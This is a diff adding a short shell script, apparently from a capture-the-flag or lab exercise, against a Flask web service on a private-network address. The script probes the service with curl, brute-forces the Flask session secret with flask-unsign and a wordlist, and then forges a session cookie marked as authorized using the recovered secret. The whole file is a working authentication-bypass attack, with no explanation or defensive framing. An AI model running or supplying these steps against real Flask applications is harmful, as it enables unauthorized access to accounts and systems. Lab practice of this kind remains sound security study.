@@ -1,0 +1,7 @@
+curl -I http://192.168.122.98:1999/refreshTime
+
+echo "SESSION_TOKEN" > cookie.txt
+
+flask-unsign --unsign -w wordlist.txt --no-literal-eval --cookie < cookie.txt
+
+flask-unsign --sign --cookie '{"authorized": True}' --secret 'e74ae' --no-literal-eval
